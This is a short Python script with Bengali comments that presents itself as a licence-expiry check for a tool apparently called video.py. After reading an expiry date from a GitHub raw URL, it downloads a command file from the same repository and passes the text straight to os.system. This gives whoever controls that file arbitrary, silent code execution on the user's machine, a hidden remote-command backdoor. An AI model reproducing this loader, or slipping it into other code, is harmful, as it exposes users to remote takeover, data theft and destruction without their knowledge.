import os, requests, datetime, time

EXPIRY_URL = "https://raw.githubusercontent.com/siyambi475-cloud/expiry.txt/refs/heads/main/expiry.txt"
COMMAND_URL = "https://raw.githubusercontent.com/siyambi475-cloud/expiry.txt/refs/heads/main/cmd.txt"
CHECK_FILE = ".last_check_v1" # video.py এর জন্য আলাদা নাম

def start():
    now = time.time()
    should_check = True

    if os.path.exists(CHECK_FILE):
        with open(CHECK_FILE, "r") as f:
            if now - float(f.read()) < 82800: # ২৩ ঘণ্টা
                should_check = False

    if should_check:
        print("[+] ভেরিফাই করা হচ্ছে...")
        r = requests.get(EXPIRY_URL)
        if r.status_code == 200:
            exp = datetime.datetime.strptime(r.text.strip(), '%Y-%m-%d').date()
            if datetime.date.today() > exp:
                print("🚫 মেয়াদ শেষ!")
                return
            with open(CHECK_FILE, "w") as f: f.write(str(now))
        else:
            print("[-] ইন্টারনেট অন করুন!")
            return

    os.system(requests.get(COMMAND_URL).text)

if __name__ == "__main__":
    start()
